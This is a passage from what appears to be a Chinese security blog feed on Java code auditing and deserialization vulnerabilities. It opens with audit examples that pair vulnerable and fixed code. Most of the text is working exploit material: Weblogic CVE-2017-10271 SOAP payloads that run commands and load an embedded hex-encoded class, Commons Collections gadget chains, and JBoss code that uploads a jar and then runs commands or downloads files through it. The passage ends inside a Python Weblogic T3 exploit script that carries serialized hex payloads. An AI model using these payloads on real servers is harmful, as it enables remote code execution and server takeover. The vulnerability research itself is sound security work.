FileInputStream(file)); int n = -1; //遍历，开始下载 while ((n = input.read(buffer, 0, 4096)) &gt; -1) &#123; output.write(buffer, 0, n); &#125; output.flush(); //不可少 response.flushBuffer();//不可少 &#125; catch (Exception e) &#123; //异常自己捕捉 &#125; finally &#123; //关闭流，不可少 if (input != null) input.close(); if (output != null) output.close(); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 防范建议 严格的权限限制。 控制路径后缀，对文件名进行检查等。 采用getCanonicalPath、getAbsolutePath等方法。 任意文件上传原理当攻击者利用恶意文件上传漏洞时，通常会向服务器上传jsp木马并访问，可以直接控制服务器。 合法输入1234567891011-----------------------------11922861918696Content-Disposition: form-data; name=&quot;name&quot;test.txt-----------------------------11922861918696Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;Content-Type: text/plaintest-----------------------------11922861918696-- 恶意输入12345678910111213-----------------------------11922861918696Content-Disposition: form-data; name=&quot;name&quot;../test.jsp-----------------------------11922861918696Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;Content-Type: text/plain...webshell....-----------------------------11922861918696-- Java代码分析不合规代码123456789101112131415161718192021222324252627public class FileTestController &#123; @RequestMapping(&quot;/Index&quot;) public String FileFileUpload(Map&lt;String,Object&gt; map)&#123; return &quot;Fileup&quot;; &#125; @ResponseBody @RequestMapping(value= &quot;/File/FileUpVul&quot;,method= RequestMethod.POST) public String FileFileUpVul(HttpServletRequest request,@RequestParam(&quot;file&quot;) MultipartFile file)&#123; String name = request.getParameter(&quot;name&quot;); if (!file.isEmpty()) &#123; try &#123; byte[] bytes = file.getBytes(); BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(new File(&quot;config/&quot;+name))); stream.write(bytes); stream.close(); return &quot;You successfully uploaded &quot; + name + &quot; into config/&quot; + name; &#125; catch (Exception e) &#123; return &quot;You failed to upload &quot; + name + &quot; =&gt; &quot; + e.getMessage(); &#125; &#125; else &#123; return &quot;You failed to upload &quot; + name + &quot; because the file was empty.&quot;; &#125; &#125;&#125; 合规代码1234567891011121314151617181920212223242526272829public class FileTestController &#123; @RequestMapping(&quot;/Index&quot;) public String FileFileUpload(Map&lt;String,Object&gt; map)&#123; return &quot;Fileup&quot;; &#125; @ResponseBody @RequestMapping(value= &quot;/File/FileUpVul&quot;,method= RequestMethod.POST) public String FileFileUpVul(HttpServletRequest request,@RequestParam(&quot;file&quot;) MultipartFile file)&#123; String name = DataUtil.getTimeStamp()+&quot;.jpg&quot;; if (!file.isEmpty()) &#123; try &#123; // 判断大小等等,只要做好配置，并不需要检查文件头。 if(file.getSize()&lt;1024*1024*10)&#123; byte[] bytes = file.getBytes(); BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(new File(&quot;config/&quot;+name))); stream.write(bytes); stream.close(); return &quot;You successfully uploaded &quot; + name + &quot; into config/&quot; + name; &#125; &#125; catch (Exception e) &#123; return &quot;You failed to upload &quot; + name + &quot; =&gt; &quot; + e.getMessage(); &#125; &#125; return &quot;You failed to upload &quot; + name + &quot; because the file was empty.&quot;;&#125; 防范建议 控制文件名 控制文件内容 控制上传目录的权限 XSS原理这里仅仅拿了个反射的XSS做例子。 合法输入12alicehello,alice. 恶意输入121&lt;script&gt;alert(1)&lt;/script&gt;hello,1&lt;script&gt;alert(1)&lt;/script&gt;. Java代码分析不合规代码123456789101112public class XSSTestController &#123; public String XXSXXSInject(HttpServletRequest request)&#123; String data = request.getParameter(&quot;data&quot;); if (data!=null&amp;&amp;!data.isEmpty())&#123; return &quot;hello,&quot;+data+&quot;.&quot;; &#125; return &quot;404&quot;; &#125;&#125; 合规代码123456789public class XSSTestController &#123; public String XXSXXSInject(HttpServletRequest request)&#123; String data = request.getParameter(&quot;data&quot;); if (data!=null&amp;&amp;!data.isEmpty())&#123; return &quot;hello,&quot;+HtmlUtils.htmlEscape(data)+&quot;.&quot;; &#125; return &quot;404&quot;; &#125;&#125; 121&lt;script&gt;alert(1)&lt;/script&gt;hello,1&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;. 防范建议 对用户的输入进行html编码。 其他场景这些场景和前面提到的类似或者比较浅显易懂，就不贴代码了。 压缩文件问题没有检测压缩后的大小等细节。 其他未净化输入导致日志等处被污染顾名思义，应用程序的日志被污染，如果输出到页面上也容易触发XSS。 合法输入123orleven正常用户登录失败，记录日志.....User Login Successed for: orleven 恶意输入1234orleven\r\nUser Login Successed for: administrator恶意用户登录失败，记录日志.....User Login Failed for: orlevenUser Login Successed for: administrator 正则表达式的拼接原理与SQL注入基本相同。 合法输入12search=error(.*? +public\\[\\d+\\]+.*error.*) 恶意输入12search=.*)|(.*(.*? +public\\[\\d+\\]+.*.*)|(.*.*) XML注入的拼接原理与SQL注入基本相同。 合法输入123456quantity=1&lt;item&gt; &lt;name&gt;apple&lt;/name&gt; &lt;price&gt;500.0&lt;/price&gt; &lt;quantity&gt;1&lt;/quantity&gt;&lt;item&gt; 恶意输入123456quantity=1&lt;/quantity&gt;&lt;price&gt;5.0&lt;/price&gt;&lt;quantity&gt;1&lt;item&gt; &lt;name&gt;apple&lt;/name&gt; &lt;price&gt;500.0&lt;/price&gt; &lt;quantity&gt;1&lt;/quantity&gt;&lt;price&gt;5.0&lt;/price&gt;&lt;quantity&gt;1&lt;/quantity&gt;&lt;item&gt; 总结想要学好代码审计，就必须多接触主流的的框架，例如Spring等，在了解各各类框架之后，才能更快的上手。 相关测试代码参考文章]]></content>
      <categories>
        <category>code audit</category>
      </categories>
      <tags>
        <tag>code audit</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Weblogic CVE-2017-10271]]></title>
    <url>%2F2017%2F12%2F23%2Fweblogic-cve-2017-10271%2F</url>
    <content type="text"><![CDATA[概述2017年10月17日Oracle推送更新补丁，修复其所发现的安全漏洞，其中CVE-2017-10271可能会导致攻击者获得Weblogic服务器权限，请尽快修复。 详情漏洞位置Oracle Weblogic Server WLS 安全组件 影响版本Oracle Weblogic Server 10.3.6.0Oracle Weblogic Server 12.2.1.2Oracle Weblogic Server 12.2.1.1Oracle Weblogic Server 12.1.3.0 漏洞复现修改Content-Type: text/xml，并向/wls-wsat/CoordinatorPortType发送POST数据包。123456789101112131415161718192021&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.7.0_79&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;2&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/usr/bin/touch&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;test1234567&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot; /&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt; 具体复现如下： 数据包回显POC1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java&gt; &lt;void class=&quot;java.lang.Thread&quot; method=&quot;currentThread&quot;&gt; &lt;void method=&quot;getCurrentWork&quot;&gt; &lt;void method=&quot;getResponse&quot;&gt; &lt;void method=&quot;getWriter&quot;&gt;&lt;void method=&quot;write&quot;&gt;&lt;string&gt;xmldecoder_vul_test&lt;/string&gt;&lt;/void&gt;&lt;/void&gt; &lt;/void&gt; &lt;/void&gt; &lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 命令回显POC123456789101112131415161718192021222324252627282930313233343536&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java&gt; &lt;void class=&quot;weblogic.utils.Hex&quot; method=&quot;fromHexString&quot; id=&quot;cls&quot;&gt;&lt;string&gt;0xcafebabe0000003200670a001700350800360a003700380a0039003a08003b0a0039003c07003d0a0007003508003e0a0039003f0a003900400b004100420800430800440800450800460700470a001100480a001100490a0011004a0a004b004c07004d07004e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301001e4c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578703b010003736179010029284c6a6176612f6c616e672f537472696e673b294c6a6176612f696f2f496e70757453747265616d3b010003636d640100124c6a6176612f6c616e672f537472696e673b01000769734c696e75780100015a0100056f73547970010004636d64730100104c6a6176612f7574696c2f4c6973743b01000e70726f636573734275696c64657201001a4c6a6176612f6c616e672f50726f636573734275696c6465723b01000470726f630100134c6a6176612f6c616e672f50726f636573733b0100164c6f63616c5661726961626c65547970655461626c650100244c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b01000d537461636b4d61705461626c6507004f07005001000a457863657074696f6e7307005101000a536f7572636546696c6501000b586d6c4578702e6a6176610c001800190100076f732e6e616d650700520c0053005407004f0c0055005601000377696e0c005700580100136a6176612f7574696c2f41727261794c697374010004244e4f240c0059005a0c005b005c0700500c005d005e0100092f62696e2f626173680100022d63010007636d642e6578650100022f630100186a6176612f6c616e672f50726f636573734275696c6465720c0018005f0c006000610c006200630700640c0065006601001c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578700100106a6176612f6c616e672f4f626a6563740100106a6176612f6c616e672f537472696e6701000e6a6176612f7574696c2f4c6973740100136a6176612f6c616e672f457863657074696f6e0100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000b746f4c6f7765724361736501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a010009737562737472696e670100152849294c6a6176612f6c616e672f537472696e673b010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a010013284c6a6176612f7574696c2f4c6973743b295601001372656469726563744572726f7253747265616d01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0021001600170000000000020001001800190001001a0000002f00010001000000052ab70001b100000002001b00000006000100000007001c0000000c000100000005001d001e00000001001f00200002001a0000016f000300070000009c043d1202b800034e2dc600112db600041205b60006990005033dbb000759b700083a042b1209b6000a99001319042b07b6000bb9000c020057a700441c9900231904120db9000c0200571904120eb9000c02005719042bb9000c020057a700201904120fb9000c02005719041210b9000c02005719042bb9000c020057bb0011591904b700123a05190504b60013571905b600143a061906b60015b000000004001b0000004a001200000012000200130008001400180015001a00180023001a002c001b003c001c0040001d004a001e0054001f00600021006a002200740023007d002600880027008f002800960029001c0000004800070000009c001d001e00000000009c0021002200010002009a00230024000200080094002500220003002300790026002700040088001400280029000500960006002a002b0006002c0000000c0001002300790026002d0004002e000000110004fd001a0107002ffc0021070030231c0031000000040001003200010033000000020034&lt;/string&gt; &lt;/void&gt; &lt;void class=&quot;org.mozilla.classfile.DefiningClassLoader&quot;&gt; &lt;void method=&quot;defineClass&quot;&gt; &lt;string&gt;com.supeream.exploits.XmlExp&lt;/string&gt; &lt;object idref=&quot;cls&quot;&gt;&lt;/object&gt; &lt;void method=&quot;newInstance&quot;&gt; &lt;void method=&quot;say&quot; id=&quot;proc&quot;&gt; &lt;string&gt;whoami&lt;/string&gt; &lt;/void&gt; &lt;/void&gt; &lt;/void&gt; &lt;/void&gt; &lt;void class=&quot;java.lang.Thread&quot; method=&quot;currentThread&quot;&gt; &lt;void method=&quot;getCurrentWork&quot;&gt; &lt;void method=&quot;getResponse&quot;&gt; &lt;void method=&quot;getServletOutputStream&quot;&gt; &lt;void method=&quot;writeStream&quot;&gt; &lt;object idref=&quot;proc&quot;&gt;&lt;/object&gt; &lt;/void&gt; &lt;void method=&quot;flush&quot;/&gt; &lt;/void&gt; &lt;void method=&quot;getWriter&quot;&gt;&lt;void method=&quot;write&quot;&gt;&lt;string&gt;&lt;/string&gt;&lt;/void&gt;&lt;/void&gt; &lt;/void&gt; &lt;/void&gt; &lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 总结发现POC早就是好几年前的了，主要是XMLDecoder组件没修，附：检测脚本。]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>code execution</tag>
        <tag>java</tag>
        <tag>weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Commons Collections Java 反序列化漏洞总结]]></title>
    <url>%2F2017%2F11%2F11%2Fjava-deserialize%2F</url>
    <content type="text"><![CDATA[概述Java 反序列化漏洞，‍‍序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。 序列化与反序列化12345String obj ="hello, world! This is a test!";FileOutputStream fos = new FileOutputStream("test/object");ObjectOutputStream os = new ObjectOutputStream(fos);os.writeObject(obj);os.close(); 12345FileInputStream fis = new FileInputStream("test/object");ObjectInputStream ois = new ObjectInputStream(fis);String obj2 = (String) ois.readObject(); System.out.print(obj2);ois.close(); 最后输出为hello, world! This is a test!。 Commons Collections JavaApache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。当然Java反序列化的问题就是出在org.apache.commons.collections这个库，这个库里的Package如下图所示： 123456789101112org.apache.commons.collectionsorg.apache.commons.collections.bagorg.apache.commons.collections.bidimaporg.apache.commons.collections.bufferorg.apache.commons.collections.collectionorg.apache.commons.collections.comparatorsorg.apache.commons.collections.functorsorg.apache.commons.collections.iteratorsorg.apache.commons.collections.keyvalueorg.apache.commons.collections.listorg.apache.commons.collections.maporg.apache.commons.collections.set 里面主要涉及到的类有ConstantTransformer、InvokerTransformer等 整个poc的逻辑可以这么理解，构建了BeforeTransformerMap的键值对，为其赋值，利用TransformedMap的decorate方法，可以对Map数据结构的key，value进行transforme。 TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。第一个参数为待转化的Map对象，第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空），第三个参数为Map对象内的value要经过的转化方法。 TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）); poc中对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行。 在进行反序列化时，我们会调用ObjectInputStream类的readObject()方法。如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法。 结合前述Commons Collections的特性，如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。 因此我们在poc中看见了下行的代码。 123456789101112131415161718192021222324252627282930 Transformer transforms[] = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[0]&#125; ), new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;0, new Object[0]&#125; ), new InvokerTransformer("exec", new Class[] &#123;String[].class&#125;, new Object[] &#123;commands&#125; )&#125;;Transformer transformerChain = new ChainedTransformer(transforms);Map tempMap = new HashMap();tempMap.put("value", "tentacle");Map exMap = TransformedMap.decorate(tempMap, null, transformerChain);Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;Class.class, Map.class&#125;);ctor.setAccessible(true);instance = ctor.newInstance(new Object[] &#123;Target.class, exMap&#125;);ByteArrayOutputStream bo = new ByteArrayOutputStream(10);ObjectOutputStream out = new ObjectOutputStream(bo);out.writeObject(instance);out.flush();out.close();return bo.toByteArray(); 如果要实现一个可控的poc，需要对transformer链的构造进行理解。首先来看InvokerTransformer。 123456789101112131415 Transformer transforms[] = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[0]&#125; ), new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;0, new Object[0]&#125; ), new InvokerTransformer("exec", new Class[] &#123;String[].class&#125;, new Object[] &#123;commands&#125; )&#125;; 这样，这段恶意代码本质上就是利用反射调用Runtime() 执行了一段系统命令，作用等同于： 1((Runtime)Runtime.class.getMethod("getMethod",null).invoke(null,null)).exec(commands); 其对应关系如下： 123456789101112131415161718192021222324// ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作Transformer transformerChain = new ChainedTransformer(transforms);// Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式Map tempMap = new HashMap();tempMap.put("value", "orleven");// 对Map类的数据结构进行转化// TransformedMap.decorate(目标Map, key的转化对象(单个或者链或者null), value的转化对象(单个或者链或者null));Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); //实例化一个AnnotationInvocationHandler类，将其成员变量memberValues赋值为精心构造的恶意TransformedMap对象。Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;Class.class, Map.class&#125;);ctor.setAccessible(true);instance = ctor.newInstance(new Object[] &#123;Target.class, exMap&#125;);// 序列化后转化为byte数组，提交给未做安全检测的Java应用。Java应用在进行反序列化操作时，则会触发TransformedMap的变换函数，执行预设的命令。ByteArrayOutputStream bo = new ByteArrayOutputStream(10);ObjectOutputStream out = new ObjectOutputStream(bo);out.writeObject(instance);out.flush();out.close();return bo.toByteArray(); JBossJBoss JMXInvokerServlet 反序列化JBoss JMXInvokerServlet 存在反序列化漏洞。invoker/JMXInvokerServlet 可直接向http://192.168.111.145:8080/invoker/JMXInvokerServlet发送特殊构造的恶意代码，但是由于这个漏洞本身不回显，漏洞一开始并不好利用。后来大佬们通常先上传一个jar文件，然后通过加载Jar的方式进行异常封装，从而解决了回显的问题,具体poc如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103public static Object fileupload(String filepath, byte[] data) &#123; Object instance = null; try &#123;// ((FileOutputStream)FileOutputStream.class.getDeclaredConstructor(null).newInstance(null)).write(data); Transformer transforms[] = &#123; new ConstantTransformer(FileOutputStream.class), new InvokerTransformer("getDeclaredConstructor", new Class[] &#123;Class[].class&#125;, new Object[] &#123;new Class[] &#123;String.class&#125;&#125; ), new InvokerTransformer("newInstance", new Class[] &#123;Object[].class&#125;, new Object[] &#123;new Object[] &#123;filepath&#125;&#125; ), new InvokerTransformer("write", new Class[] &#123;byte[].class&#125;, new Object[] &#123;data&#125; ) &#125;; Transformer transformerChain = new ChainedTransformer(transforms); Map tempMap = new HashMap(); tempMap.put("value", "orleven"); Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;Class.class, Map.class&#125;); ctor.setAccessible(true); instance = ctor.newInstance(new Object[]&#123;Target.class, exMap&#125;); &#125;catch (Exception e)&#123; e.printStackTrace(); return null; &#125; return instance; &#125;public static Object classInject(String packUri, String className, String[] code) &#123; Object instance = null; try &#123; // ((URLClassLoader)URLClassLoader.class.getMethod("newInstance",null).invoke(null,packUri)).loadClass(className).getMethod("main",null).invoke(null,code) Transformer transforms[] = &#123; new ConstantTransformer(URLClassLoader.class), new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"newInstance", new Class[] &#123;URL[].class&#125;&#125; ), new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;0, new Object[] &#123;new URL[] &#123;new URL(packUri)&#125;&#125;&#125; ), new InvokerTransformer("loadClass", new Class[] &#123;String.class&#125;, new Object[] &#123;className&#125;), new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"main", new Class[] &#123;String[].class&#125;&#125; ), new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;0, new Object[] &#123;code&#125;&#125; ) &#125;; Transformer transformerChain = new ChainedTransformer(transforms); Map tempMap = new HashMap(); tempMap.put("value", "orleven"); Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;Class.class, Map.class&#125;); ctor.setAccessible(true); instance = ctor.newInstance(new Object[]&#123;Target.class, exMap&#125;); &#125;catch (Exception e)&#123; e.printStackTrace(); return null; &#125; return instance; &#125; public static byte[] getPayload(Object instance)&#123; try&#123; ByteArrayOutputStream bo = new ByteArrayOutputStream(10); ObjectOutputStream out = new ObjectOutputStream(bo); out.writeObject(instance); out.flush(); out.close(); return bo.toByteArray(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125; // 上传jar getPayload(fileupload("util.jar",filedata)); // 执行命令 getPayload(classInject("file:util.jar","jc.util.CommUtil",new String[]&#123;"data","-action","runcmd","uname -a"&#125;)); // 下载文件 getPayload(classInject("file:util.jar","jc.util.CommUtil",new String[]&#123;"data","-action","file-download",filename&#125;)); JBoss CVE-2017-12149JBoss /invoker/readonly 存在反序列化漏洞，即没有对数据进行任何的安全处理便进行了反序列化处理，造成了漏洞的形成。 访问服务器的/invoker/readonly页面，服务器返回500错误 这个漏洞的POC和前一个JBoss反序列化漏洞基本相同，所以这里就不贴代码了。 发送payload后服务端的日志如下： Weblogic因为weblogic会把异常直接打印到服务器端的控制台上，所以在jboss中通过异常封装回显的方法在weblogic上并不适用。但是weblogic有更方便的方法，weblogic是通过T3协议来传输序列化的类，那我们就可以通过T3协议来实现exploit和server的通信，因为weblogic的T3协议和WEB协议共用同一个端口，所以只要能访问weblogic，就可以利用，不需要加载远程类，因此对服务器能否连外网没有要求。 T3 协议这里主要介绍下T3协议，不想看的可以跳过这里。T3 也称为丰富套接字，是BEA内部协议，功能丰富，可扩展性好。T3是多工双向和异步协议，经过高度优化，只使用一个套接字和一条线程。WebLogic Server 中的 RMI（远程方法调用） 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。服务器实例将跟踪所连接的每个 Java 虚拟机（Java Virtual Machine，简称 JVM），并创建单个 T3 连接以承担 JVM 的所有流量。请参阅“管理控制台联机帮助”中的配置 T3 协议。 使用T3协议向服务器发送数据：1t3 7.0.0.0\nAS:10\nHL:19\n\n 第一行为t3加weblogic客户端的版本号。 weblogic服务器的返回数据为:1HELO:10.0.2.0.false\nAS:2048\nHL:19\n\n 第一行为HELO:加weblogic服务器的版本号。weblogic客户端与服务器发送的数据均以\n\n结尾。 经测试，使用1t3 9.2.0\nAS:255\nHL:19\n\n 字符串作为T3的协议头发送给weblogic9、weblogic10g、weblogic11g、weblogic12c均合法。 在收到服务器的返回数据包后，就可了发送poc了。 poc的结构为：发送的数据长度 + weblogic的固定数据 + 反序列化的恶意代码 + 其他数据，具体如下： 即可触发漏洞。 CVE-2015-4852这个版本没有任何的过滤，可直接利用。 CVE-2016-0638、CVE-2016-3510、CVE-2017-3248因为weblogic的补丁是采用黑名单的过滤方式进行修补，容易有绕过的方式，下面就是大佬们的相关脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# -*- coding: utf-8 -*-import socketimport timeimport re## @author iswin@threathunter.org# reffer: nessus#VUL=['CVE-2016-0638','CVE-2016-3510','CVE-2017-3248']PAYLOAD=['aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78','aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870','aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e3100000000000000006ed6d97b00000000000000000000000000000078']VER_SIG=['weblogic.jms.common.StreamMessageImpl','org.apache.commons.collections.functors.InvokerTransformer','\\$Proxy[0-9]+']def t3handshake(sock,server_addr): sock.connect(server_addr) sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex')) time.sleep(1) sock.recv(1024) print 'handshake successful'def buildT3RequestObject(sock,port): data1 = 